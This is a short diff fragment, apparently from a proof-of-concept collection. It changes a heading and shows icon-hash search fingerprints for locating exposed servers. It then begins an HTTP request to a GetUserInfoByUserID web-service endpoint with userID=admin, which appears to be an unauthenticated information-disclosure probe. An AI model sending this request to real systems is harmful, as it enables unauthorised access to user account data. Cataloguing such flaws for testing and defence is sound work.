@@ -6,7 +6,7 @@
 icon_hash="1474455751" || icon_hash="702238928"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin HTTP/1.1
